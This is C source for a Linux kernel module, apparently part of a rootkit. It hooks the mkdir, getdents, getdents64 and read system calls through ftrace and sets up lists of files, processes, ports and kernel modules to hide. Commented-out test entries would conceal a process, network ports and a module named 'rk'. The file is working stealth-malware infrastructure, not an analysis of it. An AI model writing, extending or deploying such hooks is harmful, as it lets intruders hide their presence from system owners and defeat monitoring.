#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/namei.h>

#include "hooks.h"

#include "mkdir_hook.h"
#include "getdents_hook.h"
#include "readdir_hook.h"
#include "read_hook.h"

#include "../hooklib/hooklib.h"
#include "../tools/string_list.h"


#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long (*orig_mkdir)(const struct pt_regs *);
asmlinkage int (*orig_getdents)(const struct pt_regs *);
asmlinkage int (*orig_getdents64)(const struct pt_regs *);
asmlinkage int (*orig_readdir)(const struct pt_regs *);
asmlinkage ssize_t (*orig_read)(const struct pt_regs *);
asmlinkage long (*orig_socketcall)(const struct pt_regs *);
#else
asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
asmlinkage int (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
asmlinkage int (*orig_readdir)(unsigned int fd, struct old_linux_dirent* dirp, unsigned int count);
asmlinkage ssize_t (*orig_read)(int fd, void* buf, size_t count);
asmlinkage long (*orig_socketcall)(unsigned int number, void* args);
#endif

PStringList hidden_files;
PStringList hidden_procs;
PStringList hidden_ports;
PStringList hidden_modules;

static struct ftrace_hook hooks[]={
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("sys_getdents", hook_getdents, &orig_getdents),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    //HOOK("readdir", hook_readdir, &orig_readdir),
    HOOK("sys_read", hook_read, &orig_read),
};

int install_syscall_hooks(void){
    int err;
    hidden_files = list_create();
    hidden_procs = list_create();
    hidden_ports = list_create();
    hidden_modules = list_create();
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err){
        return err;
    }
    //list_insert(hidden_files, "/home/vagrant/HiddenFileFullpath");
    //list_insert(hidden_files, "HidedDirectoryTest");
    //list_insert(hidden_procs, "tmux");
    //list_insert(hidden_procs, "37442");
    //list_insert(hidden_ports, "L53");
    //list_insert(hidden_ports, "R35394");
    //list_insert(hidden_modules, "rk");
    //list_insert(hidden_modules, "vboxvideo");
    printk(KERN_INFO"Hooks installed\n");
    return 0;
}

void remove_syscall_hooks(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    list_destroy(hidden_files);
    list_destroy(hidden_procs);
    list_destroy(hidden_ports);
    list_destroy(hidden_modules);
    printk(KERN_INFO"Hooks removed\n");
}
